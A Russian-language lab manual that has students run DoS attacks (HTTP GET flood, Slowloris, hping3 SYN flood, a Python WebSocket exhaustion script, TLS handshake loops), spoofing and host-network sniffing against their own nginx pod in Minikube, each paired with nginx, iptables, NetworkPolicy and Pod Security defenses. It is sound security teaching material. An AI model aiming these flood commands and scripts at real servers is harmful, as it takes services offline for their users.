# Методика выполнения лабораторной работы «Исследование механизмов сетевых атак и методов защиты в среде Kubernetes»

Цель: Изучить принципы работы атак на разных уровнях модели OSI (L4, L7) и настроить эшелонированную защиту веб-сервера.

1. Подготовка окружения.
УЗ от ВМ: lubuntu:lubuntu (в целом можно выполнять на любой ВМ с актуальным docker и minikubes)
Для лабораторного стенда будет использоваться Minikube – упрощенная реализация Kubernetes. Minikube позволяет быстро развернуть простой кластер Kubernetes на локальной машине
Если вывод команды не пустой и вы видите слова vmx или svm — значит можно продолжать.
Для управления кластером Kubernetes используется ПО kubectl. Для установки необходимо:
1)	загрузить последнюю версию и сделать загруженный бинарный файл kubectl исполняемым:
`curl  LO https://dl.k8s.io/release/`curl  LS https://dl.k8s.io/release/stable.txt`/bin/linux/amd64/kubectl`
`chmod +x ./kubectl`
2)	переместить бинарный файл в директорию из переменной окружения PATH и проверим версию ПО
`sudo mv ./kubectl /usr/local/bin/kubectl`
`kubectl version --client`
 
Minikube запускается либо в ВМ, либо в контейнере как в нашем случае. Для его работы потребуется Docker, чтобы его установить выполните следующие действия:
`sudo apt update`
`sudo apt-get install curl wget apt-transport-https virtualbox virtualbox-ext-pack -y`
`sudo apt-get install docker.io -y`
Чтобы проверить, что Docker установлен и запущен используются следующие команды:
`docker --version`
`systemctl status docker `(systemctl start docker, если не запущен)
Так же необходимо добавить текущего пользователя в группу Docker, чтобы иметь возможность запуска без sudo
`sudo usermod -aG docker $USER && newgrp docker`
 
Чтобы установить minikube воспользуйтесь следующими командами:
`curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64`
`sudo install minikube-linux-amd64 /usr/local/bin/minikube`
`rm minikube-linux-amd64`
Чтобы начать работать запустите кластер k8s (драйвер docker будет выбран автоматически)
`minikube start --cpus 2 --memory=3072 --network-plugin=cni --cni=calico `
Внимание: из-за сильного ограничения ресурсов инициализация кластера и скачивание образов могут занять 3–5 минут. Пожалуйста, дождитесь полного запуска.
Проверьте статус кластера:
`minikube status`
Убедитесь, что компоненты host, kubelet и apiserver находятся в статусе Running
 
 
# 2. Сценарий выполнения работы
## 2.1 Настройка веб-сервера
Создайте следующие пространства имен для «жертвы» и «ботнета»
`kubectl create namespace victim`
`kubectl create namespace botnet`
 
В качестве «жертвы» используется веб-сервер nginx, его конфигурация должна хранится в файле target.yaml:
Создайте файл target.yaml

Чтобы запустить «под» веб-сервера воспользуйтесь командой
`kubectl apply -f target.yaml`
 
Для просмотра статусов «подов» и получения их имён используется команда 
`kubectl get pods -n <namespace>`
 
Для проверки, что веб-сервер запущен зайдем на него (важно! – нужно запомнить команды) и отправим запрос на получение веб-страницы
`kubectl exec -it -n victim target-server -- sh`
`curl -I http://localhost/`
Если ответ, код – 200, и страница получена, всё успешно.
 
 
## 2.2	HTTP GET Flood
Чтобы начать атаку, при которой «ботнет» отправляет на сервер массовое количество HTTP GET-запросов, мы будем использовать стандартные средства развертывания Kubernetes. Это позволит эмулировать распределенную нагрузку.
Для создания развертывания (Deployment) с атакующими контейнерами выполните следующую команду. Она создаст поды на базе образа alpine, которые будут бесконечно в цикле отправлять запросы к веб-серверу:
`kubectl create deployment bot-get-flood --image=dockerhub.timeweb.cloud/library/alpine:latest -n botnet -- sh -c "apk add --no-cache curl && while true; do curl -s http://target-service.victim.svc.cluster.local > /dev/null; done"`
или 
`kubectl create deployment bot-get-flood --image=dockerhub.timeweb.cloud/library/alpine:latest -n botnet -- /bin/sh -c "while true; do wget -q -O- http://target-service.victim.svc.cluster.local > /dev/null; done"`
 
Для увеличения мощности атаки (масштабирования ботнета) увеличьте количество реплик (подов):
`kubectl scale deployment bot-get-flood --replicas=5 -n botnet`
 

Проверьте загрузку CPU с помощью утилиты top. Также подсчитайте количество запросов к серверу:
`kubectl exec -it -n victim target-server -- sh`
`top`
`cat /var/log/nginx/access.log | wc -l`
 
 
 
Чтобы просмотреть, с каких адресов идёт больше всего запросов, воспользуйтесь командой:
`awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -n 5`
 
Также логи можно посмотреть с помощью команды:
`kubectl logs -f target-server -n victim`

Защита:
Чтобы защититься от подобной атаки, необходимо настроить ограничение частоты запросов на веб-сервере (Rate Limiting).
Внесите изменения в конфигурационный файл /etc/nginx/conf.d/default.conf внутри пода:
Удалите старую read-only ссылку:
`rm /etc/nginx/conf.d/default.conf`
Создайте файл заново с помощью утилиты echo (вставляем конфигурацию одной командой):
```
cat << 'EOF' > /etc/nginx/conf.d/default.conf
limit_req_zone $binary_remote_addr zone=l7_limit:10m rate=5r/s;
server {
    listen 80;
    location / {
        limit_req zone=l7_limit burst=10 nodelay;
        root   /usr/share/nginx/html;
        index  index.html index.htm;
    }
}
EOF
```
Перезапустите конфигурацию Nginx:
`nginx -s reload`
 
Продиагностируйте, что теперь произойдет с атакой. Сервер должен начать возвращать статус 503 Service Unavailable для избыточных запросов, сохраняя доступность. 
`kubectl logs target-server -n victim | grep " 503"`
 
После проверки остановите атаку:
`kubectl delete deployment bot-get-flood -n botnet`
 
 

## 2.3	Slowloris (L7 Slow Attack)
Для обхода блокировок по Rate Limiting злоумышленник может открыть HTTP-соединение и отсылать заголовки пакетов крайне медленно, исчерпывая пул свободных потоков сервера (L7-атака).
`kubectl run bot-slowloris -it --rm --image=dockerhub.timeweb.cloud/library/python:3.9-slim -n botnet -- bash`
Внутри запущенного контейнера установите утилиту
`pip install slowloris`
 
Запустите атаку:
`slowloris <victim_name> -p 80 -s 500`
 
Примечание: не закрывайте терминал, атака идет в реальном времени.

В отдельном окне терминала зайдите на сервер-жертву и проверьте активные сессии:
`netstat -an | grep :80 | grep ESTABLISHED`
Также попытайтесь сделать легитимный запрос через curl http://localhost/ — сервер перестанет отвечать.
 

Защита:
Чтобы предотвратить данную атаку, необходимо настроить веб-сервер на агрессивный разрыв «медленных» соединений с помощью таймаутов.
Отредактируйте /etc/nginx/conf.d/default.conf, добавив в блок server:
```
client_body_timeout 5s;
client_header_timeout 5s;
keepalive_timeout 5s;
send_timeout 5s;
 ```
Примените изменения (nginx -s reload). Проверьте лог доступа, отфильтровав его по HTTP-коду 408 (Request Timeout), чтобы убедиться, что Nginx принудительно закрывает зависшие соединения.
`kubectl logs target-server -n victim | grep " 408 "`
Или зайдите в под и посмотрите напрямую:
`cat /var/log/nginx/access.log | grep " 408 "`
 

 
## 2.4	TCP SYN Flood
При данном типе DDoS-атаки боты отправляют SYN-пакеты, но игнорируют ответные SYN-ACK от сервера. Это приводит к заполнению очереди полуоткрытых соединений (backlog) на уровне ядра ОС.
Для генерации RAW-пакетов (TCP SYN) поду требуются расширенные сетевые привилегии (NET_ADMIN). Создадим файл манифеста bot-syn.yaml

Примените манифест:
`kubectl apply -f bot-syn.yaml`

Узнайте прямой IP пода-жертвы
`kubectl get pods -n victim -o wide`
 
После запуска пода (для проверки запуска используйте kubectl get pods -n botnet), зайдите в него и запустите флуд:
`kubectl exec -it bot-syn -n botnet -- sh`
`hping3 -S -p 80 --fast -c 0 <ip_victim>`
 
Перейдите в терминал сервера-жертвы и проверьте очередь полуоткрытых соединений:
`netstat -ant | grep SYN_RECV`
 
В нашем случае очередь полуоткрытых соединений будет пустой, т.к. SYN Cookies (защита от SYN-флуда) включены в ядре самой ноды Minikube (net.ipv4.tcp_syncookies=1). Ядро просто не выделяет память под сокет и не переводит его в SYN_RECV, а сразу кодирует информацию в TCP Sequence Number

Защита (пример для не пода kubernetes):
Для защиты на транспортном уровне необходимо настроить параметры стека TCP/IP в ядре Linux. Зайдите в контейнер сервера (он запущен в привилегированном режиме согласно target.yaml) и включите механизм SYN Cookies:
`sysctl -w net.ipv4.tcp_syncookies=1`
`sysctl -w net.ipv4.tcp_max_syn_backlog=4096`
После этого ядро перестанет выделять память под каждое входящее SYN-соединение до получения ACK, что позволит серверу штатно обрабатывать легитимные запросы даже при переполненной очереди. 

Удалите атакующий под после тестирования: `kubectl delete pod bot-syn -n botnet`
 
## 2.5	WebSocket Flood
Атака на исчерпание соединений через WebSocket (WS) опасна тем, что WS-соединения являются долгоживущими (persistent). Злоумышленник открывает множество сессий и держит их открытыми, исчерпывая лимиты подключений сервера (File Descriptors).
Для тестирования перенастроим Nginx на поддержку WebSocket. Изменим /etc/nginx/conf.d/default.conf:
```
cat << 'EOF' > /etc/nginx/conf.d/default.conf
# 1. Настройка динамического апгрейда протокола для WebSocket
map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
}
```
**2. Настройка зоны ограничения частоты запросов (HTTP Rate Limiting)**
```
limit_req_zone $binary_remote_addr zone=l7_limit:10m rate=5r/s;

server {
    listen 80;

    # === Защита от медленных L7 атак (Slowloris) ===
    client_body_timeout 300s;
    client_header_timeout 300s;
    keepalive_timeout 300s;
    send_timeout 300s;

    # === Локация для обычного HTTP-трафика и Rate Limiting ===
    location / {
        limit_req zone=l7_limit burst=10 nodelay;
        root   /usr/share/nginx/html;
        index  index.html index.htm;
    }

    # === Локация для атаки WebSocket Flood ===
    # Направляем сюда WebSocket-ботов (например, ws://<IP-сервиса>/ws)
    location /ws {
        proxy_pass http://127.0.0.1:80/ws-fake-backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
    }

    # Фейковый эндпоинт, возвращающий код 101 для фиксации WS-соединений
    location /ws-fake-backend {
        return 101;
    }
}
EOF
```
 

Перезапустите Nginx (`nginx -s reload`).

Запустите атакующий под:
`kubectl run bot-ws -it --rm --image=python:3.9-slim -n botnet -- bash`
Внутри пода установите библиотек и запустите скрипт 
```
pip install websockets asyncio
python -c "
import asyncio, socket
async def attack(target_ip, port, path, count):
    conns = []
    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            await asyncio.get_event_loop().sock_connect(s, (target_ip, port))
            req = f'GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n'
            await asyncio.get_event_loop().sock_sendall(s, req.encode())
            conns.append(s)
            if i % 50 == 0: print(f'Открыто {len(conns)} соединений')
            await asyncio.sleep(0.02)
        except Exception as e:
            print(f'Ошибка: {e}')
            break
    await asyncio.sleep(600)
target_ip = socket.gethostbyname('target-service.victim.svc.cluster.local')
asyncio.run(attack(target_ip, 80, '/ws', 500))
"
```
После этого на жертве через команду 
`netstat -an | grep :80 | grep ESTABLISHED | wc -l `

вы наглядно увидите, как эти соединения висят в памяти сервера и не закрываются
 
Защита:
Защита от этого типа атак базируется на ограничении числа одновременных соединений с одного IP-адреса.
Добавьте правило iptables, ограничивающее количество одновременных TCP-соединений с одного IP-адреса:
`apk update`
`apk add iptables`
`iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 10 --connlimit-mask 32 -j REJECT --reject-with tcp-reset`

Убедитесь, что правило активное: `iptables -L INPUT -v -n`

Запустите атаку из ботнета (см. пункт 2.6). Наблюдайте за количеством соединений:
`watch -n 1 'netstat -an | grep :80 | grep ESTABLISHED | wc -l'`
 

 
## 2.6	SSL/TLS Exhaustion (Исчерпание ресурсов при рукопожатии)
Атака нацелена на истощение ресурсов CPU сервера. Процесс установки защищенного соединения (TLS Handshake) требует от сервера выполнения ресурсоемких асимметричных криптографических операций.
Для начала сгенерируем самоподписанный сертификат на сервере-жертве и включим SSL:
`apk add openssl`
`openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/nginx/cert.key -out /etc/nginx/cert.crt -subj "/CN=victim"`
 
Измените /etc/nginx/conf.d/default.conf, добавив слушатель 443 порта:
```
server {
    listen 80;
    listen 443 ssl;
    ssl_certificate /etc/nginx/cert.crt;
    ssl_certificate_key /etc/nginx/cert.key;
    # ... остальная конфигурация
}
```
Перезапустите Nginx (`nginx -s reload`).

Запустите атаку с помощью bot-syn пода (п. 2.4). Удалите под и создайте его заново
`kubectl delete pod bot-syn -n botnet`
`kubectl apply -f bot-syn.yaml`

Получите ip-адрес жертвы
`kubectl get pods -n victim -o wide`
 

Войдём в под ботнета для атаки
`kubectl exec -it -n botnet bot-syn -- sh`
Внутри пода:
`apk add openssl`
Эмулируем постоянный перезапуск TLS Handshake без переиспользования сессий
`echo "Q" | openssl s_client -connect <ip-адрес жертвы>:443`
 
Для создания нагрузки это можно зациклить:
`while true; do echo "Q" | openssl s_client -connect <ip-адрес жертвы>:443 > /dev/null 2>&1; done`
Посмотрите на сервере утилитой top, как растет нагрузка на CPU процессом nginx. 

Защита:
Для снижения вычислительной нагрузки включите кэширование TLS-сессий и ограничьте частоту соединений. В блоке server настройте параметры:
```
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 10m;
```

Кэширование позволит клиентам повторно использовать симметричные ключи, минуя фазу асимметричного шифрования.
Для проверки того, что сервер успешно кэширует сессии и экономит ресурсы CPU, используйте утилиту openssl с флагом -reconnect
`openssl s_client -connect target-service.victim.svc.cluster.local:443 -reconnect -no_ign_eof -tls1_2 < /dev/null 2>&1 | grep -E "New|Reused"`
  
## 2.7	Подмена адреса источника (Spoofing)
При спуфинге злоумышленник целенаправленно модифицирует заголовки пакетов на канальном (L2) или сетевом (L3) уровнях, чтобы выдать себя за доверенный узел (например, администратора) или обойти механизмы фильтрации по адресам.

### 2.7.1.	MAC Spoofing (Подмена на уровне L2)
Для проведения этой атаки нам потребуются привилегии управления сетью. Зайдем в атакующий под bot-syn (он был заранее запущен с параметром NET_ADMIN):
`kubectl exec -it bot-syn -n botnet -- sh`
Проверим текущий MAC-адрес интерфейса пода и изменим его на произвольный (например, 00:11:22:33:44:55) с помощью встроенной утилиты ip:
```
ip link show eth0
ip link set dev eth0 address 00:11:22:33:44:55
ip link show eth0
```

На стороне жертвы (target-server) запустите tcpdump с флагом -e (Ethernet)
`tcpdump -e -n -i eth0 icmp or tcp port 80`
 
На стороне атакующего (bot-syn) отправьте пакет
`ping -c 3 <IP_ПОДА_ЖЕРТВЫ>`

Примечание: В зависимости от используемого в кластере CNI-плагина (например, Flannel или Calico), гипервизор или виртуальный коммутатор ноды может отбросить трафик от неизвестного MAC-адреса. Это наглядно демонстрирует работу защиты на канальном уровне.
 
### 2.7.2.	IP Spoofing (Подмена на уровне L3)
Смоделируем ситуацию: веб-сервер принимает управляющие команды или имеет доступную панель только для доверенного внутреннего IP-адреса администратора (например, 10.99.99.99).
Находясь внутри пода bot-syn, воспользуемся утилитой hping3 для отправки TCP-запросов (флаг SYN), в которых исходный IP-адрес будет жестко подменен на адрес администратора с помощью ключа -a:
`hping3 -S -p 80 -a 10.99.99.99 -c 5 target-service.victim.svc.cluster.local`
 
Вы увидите 100% packet loss. Чтобы понять причину, откройте два терминала и запустите tcpdump -n -i eth0 одновременно на атакующем поде и на жертве, а затем повторите атаку.
Жертва:
 
Атакующий:
 
Результат: На атакующем поде вы увидите, что пакеты с поддельным IP успешно генерируются. Однако на жертве пакеты не появятся.
Почему так произошло?
В отличие от классических сетей, CNI-плагин Calico в Kubernetes реализует строгую защиту от подмены IP-адресов (Anti-Spoofing). Агент Calico на хост-ноде проверяет исходящие пакеты каждого пода. Если исходный IP-адрес пакета не совпадает с реальным IP-адресом, выданным контроллером кластера, пакет отбрасывается на уровне ядра ноды еще до выхода в оверлейную сеть. Это делает классический IP-спуфинг в Kubernetes невозможным без компрометации самой ноды.
Защита от IP Spoofing:
В корпоративных сетях реализуется на маршрутизаторах с помощью механизма uRPF (BCP38). В Kubernetes эту роль на себя берет CNI-плагин (Calico), который аппаратно/программно блокирует любые попытки L3-спуфинга внутри кластера.
 
## 2.8	TCP Session Hijacking и сниффинг трафика
В традиционных сетях для перехвата чужого трафика злоумышленники используют атаки типа ARP-Spoofing. В Kubernetes виртуальная сеть (CNI) изолирует сетевые интерфейсы подов , делая классический L2-перехват невозможным.  
Однако, если администратор кластера допускает ошибку в конфигурации безопасности и позволяет запускать поды с параметром hostNetwork: true, злоумышленник может «вырваться» из изолированного пространства имен пода и получить доступ к корневому сетевому интерфейсу самой ноды кластера (worker node). С этого момента он сможет прослушивать нешифрованный трафик всех подов, запущенных на этом узле.
Смоделируем ситуацию, при которой злоумышленник развернул в пространстве botnet под с доступом к сети хоста. Создайте файл bot-sniffer.yaml:


Примените манифест:
kubectl apply -f bot-sniffer.yaml

Зайдите в терминал атакующего пода bot-sniffer:
kubectl exec -it bot-sniffer -n botnet -- sh
Так как под находится в сети хоста, интерфейс eth0 или any теперь охватывает весь проходящий трафик узла. Запустите сниффер, перехватывающий все HTTP-пакеты, идущие на порт 80 (оставьте этот терминал открытым):
tcpdump -A -i any dst port 80
 
Откройте второе окно терминала. Мы сымитируем легитимного пользователя, который отправляет запрос из совершенно другого пода (например, из нашего старого пода bot-syn или любого другого тестового пода без привилегий).
Зайдите в другой под:
kubectl exec -it bot-syn -n botnet -- sh

curl -X POST http://target-service.victim.svc.cluster.local/login -d "username=admin&password=secretpassword"
 
 



Защита:
Единственным надежным способом защиты данных от перехвата является обязательное шифрование канала (переход на HTTPS) и внедрение заголовка HSTS. Настройка шифрования была в разделе 2.6.

При этом даже с зашифрованным трафиком само наличие сниффера в сети хоста недопустимо. Современные версии Kubernetes имеют встроенный механизм контроллера допуска (Admission Controller), который умеет блокировать опасные манифесты еще на этапе обращения к API-серверу.

Откройте терминал на хост-машине (вне подов).
Назначьте пространству имен botnet строгую политику безопасности (уровень baseline запрещает использование hostNetwork и privileged):
kubectl label --overwrite namespace botnet pod-security.kubernetes.io/enforce=baseline
 
Удалите текущий атакующий под-сниффер:
kubectl delete -f bot-sniffer.yaml

Проверка 
Попытайтесь развернуть уязвимый под заново:
kubectl apply -f bot-sniffer.yaml
 

Чтобы отменить принудительное применение политики безопасности baseline для пространства имен botnet, вам нужно удалить соответствующие метки (labels), которые вы установили ранее.
kubectl label namespace botnet pod-security.kubernetes.io/enforce-
kubectl label namespace botnet pod-security.kubernetes.io/audit-
kubectl label namespace botnet pod-security.kubernetes.io/warn-
 
## 2.9	Обход логической изоляции сети (Аналог VLAN Hopping в Kubernetes)
Реализовать классический VLAN Hopping (атака по протоколу 802.1Q) в стандартном окружении Minikube невозможно. Причина в архитектуре: Kubernetes и Minikube используют виртуальные оверлейные сети (Overlay Networks, такие как Flannel, Calico или Cilium), которые инкапсулируют трафик (чаще всего через VXLAN или IP-in-IP) и работают поверх сетевого уровня (L3). В этой среде нет виртуальных L2-коммутаторов с транковыми портами и не используются протоколы согласования транков (например, DTP), которые являются главной целью при атаках Switch Spoofing или Double Tagging.
Однако концептуальным аналогом разделения на VLAN в традиционных сетях в среде Kubernetes является разделение на пространства имен (Namespaces), а изоляция обеспечивается сетевыми политиками (Network Policies).
По умолчанию сеть в Kubernetes является «плоской» (Flat Network) — любой под может связаться с любым другим подом, даже если они находятся в разных пространствах имен. Если администратор не настроил явную изоляцию, злоумышленник, скомпрометировавший узел в сегменте botnet, может беспрепятственно атаковать критические сервисы в сегменте victim.

Зайдите в терминал атакующего пода bot-syn, который находится в пространстве имен botnet:
kubectl exec -it bot-syn -n botnet -- sh

Попробуйте обратиться к веб-серверу, который находится в логически изолированном пространстве victim:
curl -I http://target-service.victim.svc.cluster.local
Вы получите успешный ответ (HTTP 200 OK). Это демонстрирует, что логическая граница между пространствами имен проницаема, и злоумышленник может «перепрыгнуть» из сегмента бота в сегмент жертвы.
 
Защита:
Для предотвращения несанкционированного доступа между сегментами необходимо внедрить сетевые политики (Network Policies), которые работают на уровне CNI-плагина и выполняют роль строгих списков контроля доступа (ACL).
Откройте новый терминал (вне подов) и создайте файл манифеста isolate-victim.yaml. Данная политика запретит любой входящий трафик к подам с меткой app: web в пространстве victim, кроме трафика из самого пространства victim (или других разрешенных источников, если потребуется):
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: victim
spec:
  podSelector:
    matchLabels:
      app: web
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: victim

Примените политику к кластеру:
kubectl apply -f isolate-victim.yaml
 

Для корректной работы Network Policies в Minikube он должен быть запущен с поддержкой CNI-плагина, умеющего их обрабатывать, например: 
minikube start --network-plugin=cni --cni=calico

Снова вернитесь в консоль атакующего пода в пространстве botnet:
kubectl exec -it bot-syn -n botnet -- sh

Повторите попытку запроса:
curl -m 5 -I http://target-service.victim.svc.cluster.local
 

Удалите политику после тестирования
kubectl delete -f isolate-victim.yaml
 
 
## 2.10	Настройка межсетевого экрана (МСЭ) и эшелонированной защиты (дополнительное задание)
В данном разделе необходимо объединить все изученные защитные меры в единый комплекс «эшелонированной защиты» - настроить правила на уровнях L3/L4 (iptables), L7 (Nginx), примененить сетевые политики Kubernetes и контроль привилегий, а также протестировать внедрённую защиту.

### 2.10.1	Защита на сетевом и транспортном уровнях (L3/L4 МСЭ)
Системный межсетевой экран iptables позволяет отсечь грубый флуд и нелегитимные пакеты до того, как они достигнут приложения.
Зайдите в привилегированный контейнер сервера-жертвы:
kubectl exec -it -n victim target-server – sh

Настройте правила iptables для защиты от флуда и блокировки вредоносных узлов:
1. Блокировка конкретного IP-адреса ботнета (пример)
    Замените <IP_бота> на реальный IP из вывода kubectl get pods -n botnet -o wide
iptables -A INPUT -s <IP_бота> -j DROP

2. Защита от TCP SYN Flood – ограничение скорости новых SYN-пакетов
iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

3. Отбрасывание невалидных пакетов (сканирование, спуфинг)
iptables -A INPUT -m state --state INVALID -j DROP

Важно: Настройки sysctl для защиты от SYN-флуда (net.ipv4.tcp_syncookies=1 и net.ipv4.tcp_max_syn_backlog=4096) уже включены на ноде Minikube по умолчанию. Внутри контейнера эти параметры менять бессмысленно, так как они относятся к пространству имён ядра хоста. Для реальных кластеров настройки производятся на уровне worker-нод, а не в подах.

## 2.10.2	Изоляция сегментов сети (Защита от VLAN Hopping / Spoofing)
Чтобы злоумышленник не смог атаковать внутренние сервисы с подмененных адресов или свободно перемещаться между пространствами имен кластера, необходимо применить сетевую политику на уровне оркестратора.
Откройте новый терминал (вне подов) и примените политику, разрешающую доступ к серверу только доверенному трафику:
kubectl apply -f isolate-victim.yaml

## 2.10.3	Защита на прикладном уровне (L7 WAF / Nginx)
Настройки МСЭ бессильны, если атака имитирует легитимный трафик (например, Slowloris или HTTP GET Flood от разных ботов). В этом случае фильтрацию должен осуществлять сам веб-сервер.
В поде target-server полностью перезапишите конфигурацию /etc/nginx/conf.d/default.conf:
cat << 'EOF' > /etc/nginx/conf.d/default.conf
limit_req_zone $binary_remote_addr zone=l7_limit:10m rate=5r/s;

limit_conn_zone $binary_remote_addr zone=conn_limit_per_ip:10m;

map $http_upgrade $connection_upgrade {
    default upgrade;
    '' close;
}

server {
    listen 80;
    listen 443 ssl;

    # SSL-сертификат (самоподписанный – см. раздел 2.6)
    ssl_certificate     /etc/nginx/cert.crt;
    ssl_certificate_key /etc/nginx/cert.key;
    ssl_session_cache   shared:SSL:10m;
    ssl_session_timeout 10m;

    # Принудительный HTTPS (HSTS) – защита от сниффинга
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # Защита от Slowloris – агрессивные таймауты
    client_body_timeout   5s;
    client_header_timeout 5s;
    keepalive_timeout     5s;
    send_timeout          5s;

    # Основная локация для обычных HTTP-запросов
    location / {
        limit_req zone=l7_limit burst=10 nodelay;
        root   /usr/share/nginx/html;
        index  index.html index.htm;
    }

    # Локация для WebSocket-соединений (атака / защита)
    location /ws {
        limit_conn conn_limit_per_ip 5;        # не более 5 соединений с одного IP
        proxy_pass http://127.0.0.1:80/ws-fake-backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
    }

    # Фейковый бэкенд, возвращающий 101 Switching Protocols
    location /ws-fake-backend {
        return 101;
    }
}
EOF

Перезапустите конфигурацию Nginx для применения изменений:
nginx -t && nginx -s reload

### 2.10.4	Защита от сниффинга и привилегированных подов (Pod Security)
Сниффинг трафика становится возможен, если злоумышленник запустит под с hostNetwork: true и privileged: true. Чтобы запретить такие манифесты в namespace botnet, применим Pod Security Standards (встроенный admission controller).

kubectl label --overwrite namespace botnet \
  pod-security.kubernetes.io/enforce=baseline \
  pod-security.kubernetes.io/audit=baseline \
  pod-security.kubernetes.io/warn=baseline
После этого попытка создать под с hostNetwork: true или privileged: true в namespace botnet будет отклонена API-сервером (см. раздел 2.8). Для удаления меток используйте kubectl label namespace botnet pod-security.kubernetes.io/enforce- и т.д.

### 2.10.5	Повторное тестирование 
После применения всех защитных мер:
	Запустите любые 2–3 атаки из разделов 2.2–2.9 (например, HTTP GET Flood, Slowloris, WebSocket Flood).
	Убедитесь с помощью top (в поде target-server), что нагрузка на CPU не превышает обычных значений.
	Проверьте логи /var/log/nginx/access.log – избыточные запросы должны получать коды 503, 408 или отклоняться на уровне iptables.
	Для WebSocket-атаки выполните netstat -an | grep :80 | grep ESTABLISHED | wc -l – количество соединений с одного IP не превысит заданного в limit_conn (5).
	Попробуйте запустить под-сниффер (bot-sniffer.yaml) – он должен быть заблокирован Pod Security. 

## Контрольные вопросы
**Блок 1. Сетевые атаки сетевого и транспортного уровней (L3/L4)**
1. Объясните механику атаки TCP SYN Flood. Почему злоумышленник не завершает процесс «тройного рукопожатия» (3-way handshake)?
2. Какие параметры ядра операционной системы Linux (sysctl) позволяют нивелировать последствия SYN-флуда? Объясните принцип работы механизма SYN Cookies.
3. Как с помощью штатного межсетевого экрана (например, iptables) ограничить частоту новых подключений и отбросить невалидные пакеты без использования специализированных СЗИ?
4. Какие классы специализированных средств защиты (СЗИ) применяются на периметре сети провайдера для очистки трафика от объемных DDoS-атак (например, UDP Flood или ICMP Flood)?

**Блок 2. Атаки прикладного уровня (L7)**
5. В чем принципиальное отличие атак прикладного уровня (например, HTTP GET Flood) от атак L3/L4, и почему классические сетевые МСЭ часто пропускают такой трафик?
6. Как злоумышленник использует архитектурные особенности протокола HTTP при проведении "медленных" атак (Slowloris)?
7. Опишите методы защиты веб-сервера (Nginx, Apache) от L7-атак исключительно средствами самого веб-сервера (без применения WAF). Какие директивы отвечают за лимитирование ресурсов?
8. В каких случаях применение специализированного Web Application Firewall (WAF) становится обязательным? Приведите примеры задач, с которыми WAF справится, а базовая настройка Nginx — нет.

**Блок 3. Локальные атаки, спуфинг и изоляция в Kubernetes**
9. Каким образом злоумышленник может осуществить подмену IP-адреса (IP Spoofing) внутри кластера, и как архитектура CNI-плагинов позволяет пресечь отправку пакетов с неавторизованных адресов?
10. Сравните подходы к изоляции сегментов: чем защита от VLAN Hopping в традиционных L2-сетях отличается от механизмов предотвращения горизонтального перемещения (Lateral Movement) в среде Kubernetes?
11. Для чего применяются сетевые политики (Network Policies) в Kubernetes, если по умолчанию все поды в кластере могут свободно взаимодействовать друг с другом?
12. Если в скомпрометированном сегменте злоумышленник запустил сниффер (перехват трафика), какие административные настройки веб-приложения не позволят ему перехватить пользовательские сессии?

**Блок 4. Комплексная защита и администрирование**
13. В чем заключается концепция эшелонированной защиты применительно к защите веб-сервисов от DDoS-атак?
14. Представьте, что вы проектируете архитектуру безопасности для высоконагруженного банковского сервиса. Какой стек технологий и СЗИ вы бы внедрили на каждом уровне: от границы сети оператора связи до конкретного пода с приложением в Kubernetes?
15. Почему выдача привилегий NET_ADMIN или запуск контейнеров в режиме privileged (как это было сделано для атакующих узлов в лабораторной работе) является критической уязвимостью в реальных production-кластерах, и как этого избежать средствами K8s?
